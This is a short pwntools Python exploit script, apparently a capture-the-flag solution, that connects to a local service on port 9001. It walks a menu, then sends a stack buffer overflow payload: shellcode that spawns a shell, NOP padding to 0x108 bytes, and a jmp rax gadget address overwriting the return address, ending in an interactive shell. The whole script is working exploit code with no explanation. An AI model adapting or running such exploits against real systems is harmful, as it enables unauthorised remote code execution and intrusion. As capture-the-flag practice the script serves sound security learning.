#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf
#context.terminal = ["tmux", "splitw", "-h"]

#p = elf.process()
#p = elf.debug(gdbscript="b vuln")
p = remote("127.0.0.1", 9001)

p.sendlineafter(b"enter choice: ", str(2).encode())

p.sendlineafter(b"enter choice: ", str(1).encode())

JMP_RAX = 0x000000000040116e

payload = b""
payload += asm(shellcraft.sh())
payload = payload.ljust(0x108, b"\x90")
payload += p64(JMP_RAX)

p.sendline(payload)

p.interactive()
